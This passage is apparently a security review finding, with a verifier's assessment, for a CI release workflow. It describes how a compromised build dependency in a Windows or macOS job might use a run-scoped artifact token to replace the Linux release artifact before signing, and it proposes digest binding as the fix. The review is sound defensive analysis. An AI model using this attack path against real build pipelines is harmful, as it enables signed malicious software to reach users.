**Suggested fix.** Bind release-linux to build-linux the same way the hosted sidecar is bound: have build-linux write SHA256SUMS over the uploaded files and export its sha256 as a job output. sign-publish then runs check-win-sidecar.sh check (or an equivalent) on the downloaded directory before any signing step. Better still, move the Orca and sidecar builds into a separate workflow run whose artifacts sign-publish fetches only by run id and verified digest, so no code that runs upstream builds shares a run with the MAR-signing job.

**Verifier (PLAUSIBLE, medium).** Most of the cited code is as described. sign-publish (release.yml:1087-1092, needs only build-linux) downloads `release-linux` by name (1138-1142). It checks the manifest release_key against the tree (1151-1152), the manifest update_channel and the MAR channel (1184-1203), then signs (1205-1220). It assembles assets straight from release/ (1242-1259), and the attestation at 1261 covers whatever was downloaded. build-linux exports only `build` (78) and uploads release-linux with no digest output (217-228). windows-orca (376-491) and the macOS Orca jobs have no needs edge and run the same scripts/build-orca.sh in the same run. By contrast, windows-orca's own output is bound by sums_sha256 (382, 472-480). So the finding is right that no digest ties release-linux to build-linux.

The headline scenario fails test (4): its precondition already gives the attacker the capability. The same pinned Orca tag and lockfile are built inside build-linux itself (release.yml:169-174). That build runs `nix develop .#orca --command bash scripts/build-orca.sh` on legion as the runner user, in the workspace that is later packaged and uploaded. build-orca.sh:194-223 runs pnpm install, build-workspace-packages, rebuild:node, the mobile generators, build:mobile-web, build:orcad and build:web. Malicious code in Orca's source, or in any dependency that runs or bundles on Linux, can therefore change the Linux tarball and MAR directly before the upload at 217. It can also ship itself, because package-linux.sh:23-33 and 73 put out/orcad and out/web into the Linux package. A compromised Orca tag already reaches every Linux client as signed code, with no token theft and no artifact swap. The same applies to windows-sidecar's Theia build (it uses the same theia lockfile as build-linux:164). The workflow header (lines 6-9) states the design: release-linux is untrusted data, and the protection is the owner's approval of the release environment, not where the bytes came from.

What remains is narrower. A dependency that is installed or run only on win32 or darwin would run in windows-orca or the macOS Orca jobs and never in build-linux. Examples are a platform-gated optional binary such as a win32 rollup, esbuild or lightningcss binary that Vite calls during the build. For that actor the cross-job path is real, and the 'Linux ships alone' comments (264, 375) cover only failures, not tampering. It still depends on runtime behaviour I cannot settle statically: whether the ACTIONS_RUNTIME_TOKEN taken in windows-orca can still delete and re-upload the run artifact `release-linux` after build-linux uploads it. windows-orca has a 90-minute timeout (378). build-linux runs a Gecko build of roughly 50 minutes plus the Theia, Orca and container steps, with a 240-minute timeout (74). The attacker therefore needs the token to stay valid after its own job ends, or the timings to overlap. Whether a run-scoped artifact token can delete an artifact another job created is also runtime behaviour.

Severity is medium, not high. The general precondition is equivalent to the gain, so this is a defence-in-depth gap: build-linux exports no release-linux digest for sign-publish to check, the way sums_sha256 is checked for Windows. It matters only for a platform-gated dependency compromise and only with an unconfirmed token lifetime.
